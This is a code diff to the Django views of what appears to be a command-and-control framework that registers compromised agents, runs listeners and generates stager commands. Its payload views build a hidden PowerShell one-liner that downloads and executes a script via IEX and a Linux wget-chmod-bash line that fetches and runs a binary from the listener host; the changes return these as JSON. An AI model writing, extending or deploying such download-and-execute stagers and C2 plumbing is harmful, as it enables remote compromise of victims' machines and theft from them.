@@ -1,6 +1,7 @@
 import base64
+from django.conf import settings
 from django.contrib.auth.decorators import login_required
-from django.shortcuts import render
+from django.shortcuts import render 
 from blog.Modules.windows.DirectoryListing import DirectoryListing
 from .forms import *
 from .models import *
@@ -8,19 +9,20 @@ import netifaces
 import os
 import random
 import string
-from django.http import HttpResponse
+from django.http import HttpResponse , JsonResponse
 from django.views import View
 from flask import Flask
 import threading
 import sys
 from multiprocessing import Process
 from django.contrib.auth.models import User
-from django.http import HttpResponseRedirect
+from django.http import HttpResponseRedirect 
 from .forms import UploadFileForm
 from rest_framework.response import Response
 from rest_framework import status
 from rest_framework.views import APIView
 from .serializers import *
+
 
 listen_path = os.path.dirname(os.path.abspath(__file__))+"/data/listeners/"
 app         = Flask(__name__)
@@ -61,8 +63,9 @@ def registerAgent(request):
         Listener.agent(agentname,remoteip, eth)
         
         request.session['agentname'] = agentname
-
-        return HttpResponse(agentname)
+        response = HttpResponse(agentname)
+        response.set_cookie('agentName' , agentname)
+        return response
     else:
         return ('',204)
 
@@ -86,7 +89,9 @@ class Listener():
             #print(request.data)
             #request.data['agent']
             #eth1 = request.data['interface']
+            #return JsonResponse({"payload" : "payloads here"} , status=200)
             eth = request.POST['interface']
+            
             netifaces.ifaddresses(eth)
             ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
             output_path= "/tmp/{}".format(eth)
@@ -102,7 +107,8 @@ class Listener():
                 R.write(payload)
 
             oneliner = "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/sc/{}\')\"".format(ip, str(port), eth)
-            return render(request,'blog/payload-Gen.html', {'payloadline':oneliner})
+            return JsonResponse({"payload" : oneliner} , status=200)
+            #return render(request,'blog/payload-Gen.html', {'payloadline':oneliner})
 
         def get(self,request):
             return render(request,'blog/payload-Gen.html')
@@ -126,7 +132,8 @@ class Listener():
                 R.write(payload)
 
             oneliner = "wget http://{}:{}/download/{} -O /tmp/bash;chmod +x /tmp/bash;bash /tmp/bash".format(ip, str(port), eth)
-            return render(request,'blog/lin_payload-Gen.html', {'payloadline':oneliner})
+            return JsonResponse({"payload" : oneliner} , status=200)
+            #return render(request,'blog/lin_payload-Gen.html', {'payloadline':oneliner})
 
         def get(self,request):
             return render(request,'blog/lin_payload-Gen.html')
@@ -250,7 +257,10 @@ def LoginPage(request):
 def HomePage(request):
     listeners = ListenerForm.objects.all()
     request.session['test'] = "Helo"
-    return render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners)} )
+    response = render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners)} )
+    #response.set_cookie( 'test' , 'hello' )
+    return response
+    #return render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners)} )
 
 @login_required
 def Tasks(request):
